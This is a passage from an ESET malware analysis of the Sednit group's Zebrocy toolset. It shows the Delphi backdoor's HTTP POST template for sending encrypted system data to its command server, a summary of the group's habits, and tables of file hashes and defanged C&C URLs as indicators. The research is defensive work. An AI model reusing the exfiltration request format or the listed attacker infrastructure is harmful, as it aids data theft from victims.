data-line="crayon-605783236f996362210489-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f996362210489-22">22</div><div class="crayon-num" data-line="crayon-605783236f996362210489-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f996362210489-24">24</div><div class="crayon-num" data-line="crayon-605783236f996362210489-25">25</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-605783236f996362210489-1"><span class="crayon-e">POST</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">\</span><span class="crayon-o">/</span><span class="crayon-sy">[</span><span class="crayon-v">a</span><span class="crayon-o">-</span><span class="crayon-v">zA</span><span class="crayon-o">-</span><span class="crayon-v">Z0</span><span class="crayon-o">-</span><span class="crayon-cn">9</span><span class="crayon-sy">\</span><span class="crayon-o">-</span><span class="crayon-sy">\</span><span class="crayon-v">_</span><span class="crayon-sy">\</span><span class="crayon-o">^</span><span class="crayon-sy">\</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-o">*</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-cn">3</span><span class="crayon-sy">}</span><span class="crayon-sy">\</span><span class="crayon-sy">.</span><span class="crayon-sy">(</span><span class="crayon-v">php</span><span class="crayon-o">|</span><span class="crayon-v">dat</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-v">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f996362210489-2">&nbsp;</div><div class="crayon-line" id="crayon-605783236f996362210489-3"><span class="crayon-v">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">keep</span><span class="crayon-o">-</span><span class="crayon-e">alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f996362210489-4">&nbsp;</div><div class="crayon-line" id="crayon-605783236f996362210489-5"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">multipart</span><span class="crayon-o">/</span><span class="crayon-v">form</span><span class="crayon-o">-</span><span class="crayon-v">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">boundary</span><span class="crayon-o">=</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">&lt;</span><span class="crayon-v">mmddyyhhnnsszzz</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f996362210489-6">&nbsp;</div><div class="crayon-line" id="crayon-605783236f996362210489-7"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-v">N</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f996362210489-8">&nbsp;</div><div class="crayon-line" id="crayon-605783236f996362210489-9"><span class="crayon-v">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-v">ip_address</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f996362210489-10">&nbsp;</div><div class="crayon-line" id="crayon-605783236f996362210489-11"><span class="crayon-v">Accept</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">text</span><span class="crayon-o">/</span><span class="crayon-v">html</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-o">/</span><span class="crayon-o">*</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f996362210489-12">&nbsp;</div><div class="crayon-line" id="crayon-605783236f996362210489-13"><span class="crayon-v">Accept</span><span class="crayon-o">-</span><span class="crayon-v">Encoding</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">identity</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f996362210489-14">&nbsp;</div><div class="crayon-line" id="crayon-605783236f996362210489-15"><span class="crayon-v">User</span><span class="crayon-o">-</span><span class="crayon-v">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">Mozilla</span><span class="crayon-o">/</span><span class="crayon-cn">3.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">compatible</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">Indy </span><span class="crayon-v">Library</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f996362210489-16">&nbsp;</div><div class="crayon-line" id="crayon-605783236f996362210489-17"><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">&lt;</span><span class="crayon-v">mmddyyhhnnsszzz</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f996362210489-18">&nbsp;</div><div class="crayon-line" id="crayon-605783236f996362210489-19"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Disposition</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">form</span><span class="crayon-o">-</span><span class="crayon-v">data</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"userfile"</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">filename</span><span class="crayon-o">=</span><span class="crayon-s">"%APPDATA%\Microsoft\&lt;directories&gt;\&lt;tempfilename&gt;.tmp"</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f996362210489-20">&nbsp;</div><div class="crayon-line" id="crayon-605783236f996362210489-21"><span class="crayon-v">Content</span><span class="crayon-o">-</span><span class="crayon-v">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-v">tempfilename_hex_encoded</span><span class="crayon-o">&gt;</span><span class="crayon-sy">.</span><span class="crayon-v">tmp</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f996362210489-22">&nbsp;</div><div class="crayon-line" id="crayon-605783236f996362210489-23"><span class="crayon-o">&lt;</span><span class="crayon-e">tempfilename </span><span class="crayon-v">content</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f996362210489-24">&nbsp;</div><div class="crayon-line" id="crayon-605783236f996362210489-25"><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">&lt;</span><span class="crayon-v">mmddyyhhnnsszzz</span><span class="crayon-o">&gt;</span><span class="crayon-o">--</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p><em>Delphi backdoor POST request</em></p>
<p>The <span style="font-family: 'courier new', courier, monospace;">tempfilename</span> content is the output of whichever commands are executed. The content is encrypted using the AES-256-ECB algorithm with the first AES key from the configuration data, then the output is hexadecimal encoded. The contents sent to the C&amp;C server vary from one command to another, but all contains at least the HDD serial number and the first four bytes of the computer name.<br />
For example, <span style="font-family: 'courier new', courier, monospace;">HELLO</span> corresponds to the first packet sent by the backdoor to establish contact with the C&amp;C server. As shown below it contains the date when the task was launched, the Delphi backdoor’s internal version number, the HDD serial number, the computer name (first four bytes), the command and the date when the backdoor was executed.</p>
<p><span style="font-family: 'courier new', courier, monospace;">Start: 1/4/2018 1:37:00 PM &#8211; [&lt;vx.x&gt;]:42424242ESET-HELLO-[2018-04-04 01-37-00]-315.TXT.</span></p>
<p>The second AES key in the configuration data is used to decrypt the answer from the C&amp;C server.<br />
Like Seduploader, this backdoor is used to deploy Xagent on victim machines apparently deemed “interesting” by the operators after the reconnaissance phase.</p>
<h2>Summary</h2>
<p>A component written in Delphi is nothing new for the Sednit group, which has already used this language for <a href="https://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-full.pdf">Downdelph</a>. However, even if this latest component has nothing else in common with Downdelph  “technically speaking”, there are some points of interest worth mentioning.</p>
<ul>
<li>The deployment methods are the same, both being delivered as an email attachment.</li>
<li>We saw Downdelph for the last time in September 2015, and the first sample of Zebrocy we saw in the wild was dated November 2015.</li>
<li>Both are written in Delphi.</li>
</ul>
<p>We can hypothesize that the Sednit group abandoned one component and started to develop a new one. One thing that <em>doesn’t</em> change for the group, however, are the mistakes they made:</p>
<ul>
<li>The name of the scheduled task: <span style="font-family: 'courier new', courier, monospace;">Windiws</span></li>
<li>The function name that retrieves system information in the AutoIt downloader is <span style="font-family: 'courier new', courier, monospace;">_SOFWARE()</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">Mary</span> instead of <span style="font-family: 'courier new', courier, monospace;">Merry</span> in <span style="font-family: 'courier new', courier, monospace;">Note Letter Mary Christmas Card.doc</span></li>
</ul>
<p>The byte arrays used by the Delphi backdoor as AES-256 keys are 38 bytes long instead of 32 bytes. It’s not a spelling error but probably due to a lack of attention.</p>
<p>We have seen Zebrocy being heavily used by the Sednit group over the last two years. Our analysis of the many new variants that appeared on a regular basis since 2017 clearly indicates that Zebrocy is being actively maintained and improved by its author(s). We can consider it as one of the stable, mature tools in Sednit&#8217;s arsenal, a tool that deserves to be monitored closely.</p>
<h2>IoCs</h2>
<p><strong>Malicious documents</strong></p>

<table id="tablepress-540" class="tablepress tablepress-id-540">
<thead>
<tr class="row-1 odd">
	<th class="column-1"><strong>SHA-1</strong></th><th class="column-2"><strong>ESET Detection name</strong></th><th class="column-3"><strong>Filename</strong></th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">4f07d18475601d0492cbf678ee0f0860c729910e</td><td class="column-2">VBA/TrojanDropper.Agent.YC</td><td class="column-3">Note Letter Mary Christmas Card.doc</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">f10b2c052afc07e2dec9dbe816031059fdc900ba</td><td class="column-2">VBA/TrojanDropper.Agent.AAK</td><td class="column-3">Syria - New Russia provocations.doc</td>
</tr>
</tbody>
</table>

<p><strong>Delphi downloader</strong></p>

<table id="tablepress-541" class="tablepress tablepress-id-541">
<thead>
<tr class="row-1 odd">
	<th class="column-1"><strong>SHA-1</strong></th><th class="column-2"><strong>ESET Detection name</strong></th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">00b39f2deaf1f1fc29e5acb63f4d1100e04fd701</td><td class="column-2">Win32/TrojanDownloader.Delf.CFS</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">07e44b44c5f1043d16f6011a2cf0d2e7c5a52787</td><td class="column-2">Win32/TrojanDownloader.Delf.CFG</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">0f946f619ae8e2181a5bd76c8af03347742765c6</td><td class="column-2">Win32/TrojanDownloader.Delf.CGW</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">2900ed173a9f5dc99f905942a6be595cc6f03387</td><td class="column-2">Win32/TrojanDownloader.Delf.CFG</td>
</tr>
<tr class="row-6 even">
	<td class="column-1">2b5a7f4e054d0130883c8821b629121e0228bf54</td><td class="column-2">Win32/TrojanDownloader.Delf.CIP</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1">36b5e59a01e7f244d4a3bbb539e57aa468115dc8</td><td class="column-2">Win32/TrojanDownloader.Delf.CGB</td>
</tr>
<tr class="row-8 even">
	<td class="column-1">37bd951c483da057337ef8f38d6e48051cbb39d0</td><td class="column-2">Win32/TrojanDownloader.Delf.CHC</td>
</tr>
<tr class="row-9 odd">
	<td class="column-1">41686703ce9e9aec64b6ad1c516746751219bc62</td><td class="column-2">Win32/TrojanDownloader.Delf.CFS</td>
</tr>
<tr class="row-10 even">
	<td class="column-1">4e6470f4a245efaa138c8c6eedb046e916706383</td><td class="column-2">Win32/TrojanDownloader.Delf.CGW</td>
</tr>
<tr class="row-11 odd">
	<td class="column-1">54b14fc84f152b43c63babc46f2597b053e94627</td><td class="column-2">Win32/TrojanDownloader.Delf.CGB</td>
</tr>
<tr class="row-12 even">
	<td class="column-1">afd5a60b7fff4deea15f7011339ad2cc2987a937</td><td class="column-2">Win32/TrojanDownloader.Delf.CGW</td>
</tr>
<tr class="row-13 odd">
	<td class="column-1">d4ab51bc5c26183771e3358d76e348943f9dd2fc</td><td class="column-2">Win32/TrojanDownloader.Delf.CGB</td>
</tr>
<tr class="row-14 even">
	<td class="column-1">d6fdc72792ee736b8d606d40d72cb89d6e8a3e18</td><td class="column-2">Win32/TrojanDownloader.Delf.CFU</td>
</tr>
</tbody>
</table>

<p><strong>AutoIt downloader</strong></p>

<table id="tablepress-542" class="tablepress tablepress-id-542">
<thead>
<tr class="row-1 odd">
	<th class="column-1"><strong> SHA-1</strong></th><th class="column-2"><strong> ESET Detection name</strong></th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">0cd61d367dd0b13000774ab77abf3d4cfb713c8e</td><td class="column-2">Win32/TrojanDownloader.Autoit.ODO</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">185ab7a371b58ff367c155ec0dabe28842d340bd</td><td class="column-2">Win32/TrojanDownloader.Autoit.OBG</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">267abd7105ac26d5cb6ecb96292f83708f64b994</td><td class="column-2">Win32/TrojanDownloader.Autoit.OHC</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">4a6dcbccab5344388b331d543cc2260ca531c7ca</td><td class="column-2">Win32/Autoit.CT</td>
</tr>
<tr class="row-6 even">
	<td class="column-1">62dcf2f33ecc6014fa9a10f4e9ac9fd9bb0a6d23</td><td class="column-2">Win32/TrojanDownloader.Autoit.OCO</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1">b8b847d3d0139db68dba730b3424b29dcb40b3c7</td><td class="column-2">Win32/TrojanDownloader.Autoit.OMA</td>
</tr>
<tr class="row-8 even">
	<td class="column-1">c0271dbb02636402742c390ffbeee6418f696668</td><td class="column-2">Win32/TrojanDownloader.Autoit.OMB</td>
</tr>
<tr class="row-9 odd">
	<td class="column-1">d379b94a3eb4fd9c9a973f64d436d7fc2e9d6762</td><td class="column-2">Win32/Spy.Autoit.EI</td>
</tr>
<tr class="row-10 even">
	<td class="column-1">dabeadf0a9af3a8a0802f8445670806cd7671b1d</td><td class="column-2">Win32/TrojanDownloader.Autoit.OCI</td>
</tr>
</tbody>
</table>

<p><strong>Delphi backdoor</strong></p>

<table id="tablepress-543" class="tablepress tablepress-id-543">
<thead>
<tr class="row-1 odd">
	<th class="column-1"><strong>SHA-1</strong></th><th class="column-2"><strong>ESET Detection name</strong></th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">0983d940ba42135106bf7a1e87ed5a1975fc7ead</td><td class="column-2">Win32/Delf.BFF</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">226083c7190f1a939d5b7b352400450690d59f65</td><td class="column-2">Win32/Delf.BDW</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">245868d6805c66181808973e93f23293d6d2f7d1</td><td class="column-2">Win32/Delf.BDT</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">2c01ae417e5de213845b1ed46d4e82d45edd598d</td><td class="column-2">Win32/Delf.BBP</td>
</tr>
<tr class="row-6 even">
	<td class="column-1">4ccbe222bd97dc229b36efaf52520939da9d51c8</td><td class="column-2">Win32/Delf.BFC</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1">51ae516792570bcd069a657c27859cd3fdc07d00</td><td class="column-2">Win32/Delf.BBP</td>
</tr>
<tr class="row-8 even">
	<td class="column-1">55179f0c6bce5a37311a44efe3f9845096c09668</td><td class="column-2">Win32/Delf.AWE</td>
</tr>
<tr class="row-9 odd">
	<td class="column-1">6fd7ce97061169b835ea77976651b5bf20aca4ef</td><td class="column-2">Win32/TrojanDownloader.Delf.BRV</td>
</tr>
<tr class="row-10 even">
	<td class="column-1">7349843e4dac1226ad6ce3e3cda8c389dd599548</td><td class="column-2">Win32/TrojanDownloader.Delf.BRV</td>
</tr>
<tr class="row-11 odd">
	<td class="column-1">7b5c223a4968cc2190c1b5444cad47187d27ec50</td><td class="column-2">Win32/TrojanDownloader.Delf.BRV</td>
</tr>
<tr class="row-12 even">
	<td class="column-1">83882e13b369986b513f4aae245c112b82ec2097</td><td class="column-2">Win32/Delf.BEB</td>
</tr>
<tr class="row-13 odd">
	<td class="column-1">8aedf7a462024acf72d708c89230e4f02d94bc78</td><td class="column-2">Win32/Delf.BDT</td>
</tr>
<tr class="row-14 even">
	<td class="column-1">8bd56b580974ae195e9f92b3aa525547d33434c1</td><td class="column-2">Win32/Delf.BEC</td>
</tr>
<tr class="row-15 odd">
	<td class="column-1">9beacd8e145fa01e16409d44d8b9470af6c7afd8</td><td class="column-2">Win32/Delf.BBP</td>
</tr>
<tr class="row-16 even">
	<td class="column-1">a172fe6e91170f858c8ce5d734c094996bdf83d0</td><td class="column-2">Win32/Delf.BDT</td>
</tr>
<tr class="row-17 odd">
	<td class="column-1">ae93b6ec2d56512a1c7e8c053d2a6ce6fdfb7e4c</td><td class="column-2">Win32/Delf.BEX</td>
</tr>
<tr class="row-18 even">
	<td class="column-1">c08d89c7f7be69d5d705d4ac7e24e8f48e22faaf</td><td class="column-2">Win32/Delf.BDW</td>
</tr>
<tr class="row-19 odd">
	<td class="column-1">c2f3ca699aef3d226a800c2262efdca1470e00dc</td><td class="column-2">Win32/Delf.AVP</td>
</tr>
<tr class="row-20 even">
	<td class="column-1">cdf9c24b86bc9a872035dcf3f53f380c904ed98b</td><td class="column-2">Win32/Delf.BEH</td>
</tr>
<tr class="row-21 odd">
	<td class="column-1">f63e29621c8becac47ae6eac7bf9577bd0a37b73</td><td class="column-2">Win32/Delf.AVT</td>
</tr>
<tr class="row-22 even">
	<td class="column-1">fea8752d90d2b4f0fc49ac0d58d62090782d8c5b</td><td class="column-2">Win32/Delf.BFN</td>
</tr>
</tbody>
</table>

<h3>URLs</h3>
<p>http://142[.]0.68.2/test-update-16-8852418/temp727612430/checkUpdate89732468.php<br />
http://142[.]0.68.2/test-update-17-8752417/temp827612480/checkUpdate79832467.php<br />
http://185[.]25.50.93/syshelp/kd8812u/protocol.php<br />
http://185[.]25.50.93/tech99-04/litelib1/setwsdv4.php<br />
http://185[.]25.50.93/techicalBS391-two/supptech18i/suppid.php<br />
http://185[.]25.51.114/get-help-software/get-app-c/error-code-lookup.php<br />
http://185[.]25.51.164/srv_upd_dest_two/destBB/en.php<br />
http://185[.]25.51.198/get-data/searchId/get.php<br />
http://185[.]25.51.198/stream-upd-service-two/definition/event.php<br />
http://185[.]77.129.152/wWpYdSMRulkdp/arpz/MsKZrpUfe.php<br />
http://188[.]241.68.121/update/dB-Release/NewBaseCheck.php<br />
http://194[.]187.249.126/database-update-centre/check-system-version/id=18862.php<br />
http://194[.]187.249.126/security-services-DMHA-group/info-update-version/id77820082.php<br />
http://213[.]103.67.193/ghflYvz/vmwWIdx/realui.php<br />
http://213[.]252.244.219/client-update-info/version-id/version333.php<br />
http://213[.]252.244.219/cumulative-security-update/Summary/details.php<br />
http://213[.]252.245.132/search-release/Search-Version/crmclients.php<br />
http://213[.]252.245.132/setting-the-os-release/Support-OS-release/ApiMap.php<br />
http://220[.]158.216.127/search-sys-update-release/base-sync/db7749sc.php<br />
http://222[.]15.23.121/gft_piyes/ndhfkuryhs09/fdfd_iunb_hhert_ps.php<br />
http://46[.]102.152.127/messageID/get-data/SecurityID.php<br />
http://46[.]183.223.227/services-check-update/security-certificate-11-554/CheckNow864.php<br />
http://80[.]255.6.5/daily-update-certifaicates52735462534234/update-15.dat<br />
http://80[.]255.6.5/LoG-statistic8397420934809/date-update9048353094c/StaticIpUpdateLog23741033.php<br />
http://86[.]105.18.106/apps.update/DetailsID/clientPID-118253.php<br />
http://86[.]105.18.106/data-extract/timermodule/update-client.php<br />
http://86[.]105.18.106/debug-info/pluginId/CLISD1934.php<br />
http://86[.]105.18.106/ram-data/managerId/REM1234.php<br />
http://86[.]105.18.106/versionID/Plugin0899/debug-release01119/debug-19.app<br />
http://86[.]105.18.111/UpdateCertificate33-33725cnm^BB/CheckerNow-saMbA-99-36^11/CheckerSerface^8830-11.php<br />
http://86[.]106.131.177/srvSettings/conf4421i/support.php<br />
http://86[.]106.131.177/SupportA91i/syshelpA774i/viewsupp.php<br />
http://89[.]249.65.166/clientid-and-uniqued-r2/the-differenceU/Events76.php<br />
http://89[.]249.65.166/int-release/check-user/userid.php<br />
http://89[.]249.65.234/guard-service/Servers-ip4/upd-release/mdb4<br />
http://89[.]40.181.126/verification-online/service.911-19/check-verification-88291.php<br />
http://89[.]45.67.153/grenadLibS44-two/fIndToClose12t3/sol41.php<br />
http://89[.]45.67.153/supportfsys/t863321i/func112SerErr.php<br />
http://93[.]113.131.117/KB7735-9927/security-serv/opt.php<br />
http://93[.]113.131.155/Verifica-El-Lanzamiento/Ayuda-Del-Sistema/obtenerId.php<br />
http://93[.]115.38.132/wWpYdSMRulkdp/arpz/MsKZrpUfe.php<br />
http://rammatica[.]com/QqrAzMjp/CmKjzk/EspTkzmH.php<br />
http://rammatica[.]com/QqrAzMjp/CmKjzk/OspRkzmG.php</p>

                            
                                                            <div class="dot">
                                    <span class="icomoon icon-icon_article_dot"></span>
                                </div>

                                <div class="meta">
                                    <div class="wls-authors wls-authors-footer">
                                                <div class="wls-author">
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/esetresearch/" title="ESET Research">
                    ESET Research                </a>
            </div>
        </div>
                                            </div>
                                    <span class="strong">
								        <time datetime="2018-04-24 14:56:25">24 Apr 2018 - 02:56PM</time>
                                    </span>
                                </div>
                            
                            <div class="widgets row">
                                <div class="col-md-12 col-sm-12 col-xs-12">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                                        <h3><span class="text">Newsletter</span></h3>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
                                    			
		<div class="heading-line col-md-12 no-padding sidebar-item clearfix">
			<h3>
				<span class="text">Newsletter</span>
			</h3>

			<form action="//liondigital.us3.list-manage.com/subscribe/post?u=b76f82b1cc198ab1d80665c99&amp;id=102b0810e2" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
				<div class="search-input clearfix">
					<input type="text" name="email" value="" placeholder="Email...">
					<button>
						Submit					</button>
				</div>
			</form>		
		</div>
                                </div>
                            </div>

                                                            <div class="similar-articles row">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12">
                                        <h3><span class="text">Similar Articles</span></h3>
                                    </div>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/cybercrime/" class="category-tag-btn">Cybercrime</a>                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/fbi-cybercrime-losses-2020-ic3-623x432.jpg"
                                                         alt="Sednit update: Analysis of Zebrocy">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/">
                                                    FBI: Cybercrime losses topped US$4.2 billion in 2020                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/exchange-servers-under-siege-10-apt-groups-623x432.jpg"
                                                         alt="Sednit update: Analysis of Zebrocy">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/">
                                                    Exchange servers under siege from at least 10 APT groups                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/02/18/malware-authors-already-taking-aim-apple-m1-macs/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/apple-m1-macs-malware-1-623x432.jpg"
                                                         alt="Sednit update: Analysis of Zebrocy">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/18/malware-authors-already-taking-aim-apple-m1-macs/">
                                                    Malware authors already taking aim at Apple M1 Macs                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/eset-kobalos-hpc-high-performance-computing-malware-research-623x432.jpg"
                                                         alt="Sednit update: Analysis of Zebrocy">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/">
                                                    Kobalos – A complex Linux threat to high performance computing infrastructure                                                </a>
                                            </h4>
                                        </article>
                                                                    </div>
                            
                            <div class="comments row">
                                <div class="heading-line col-xs-12">
                                    <h3><span class="text">Discussion</span></h3>
                                                                            
<div id="disqus_thread"></div>
                                                                    </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    	</div> 	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-2">
                    <div class="hidden-sm hidden-xs">
                        <div class="logo-wrapper footer clearfix">
                            <div class="dark clearfix">
                                <a href="https://www.welivesecurity.com/" class="wls">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-1.svg" alt="Welivesecurity.com">
                                </a>
                                <a href="https://www.eset.com" class="eset">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-2.svg" alt="by ESET">
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="hidden-lg hidden-md">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
				</div>
				<nav id="footer" class="clearfix">
											<div class="mobile-block">
																<div class="col-md-2 col-md-offset-2">
										<ul>
																							<li>
													<a href="/">Home</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/about-us/">About Us</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/contact-us/">Contact Us</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/sitemap/">Sitemap</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/our-experts/">Our Experts</a>
												</li>
																							<li>
													<a href="https://eset.com">ESET</a>
												</li>
																					</ul>
									</div>
													</div>
											<div class="mobile-block">
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/research/">Research</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/category/how-to/">How To</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/categories/">Categories</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/rss-configurator/">RSS Configurator</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/news-widget-generator/">News Widget</a>
												</li>
																					</ul>
									</div>
													</div>
									</nav>
			</div>
			<div class="row">
				<div class="col-md-12 legal clearfix">
					<div class="wrap clearfix">
													<span>
								<a href="https://www.welivesecurity.com/privacy/">
									Privacy policy								</a>
							</span>
													<span>
								<a href="https://www.welivesecurity.com/legal-information/">
									Legal Information								</a>
							</span>
											</div>
					<span class="copyright pull-right">Copyright &copy; ESET, All Rights Reserved</span>
				</div>
							</div>
		</div>
	</footer>
	
	<button id="back-to-top" class="animated-scroll" data-target="absoluteTop">
		<span class="icomoon icon-icon_arrow"></span>
		<span class="text">Back to top</span>
	</button>

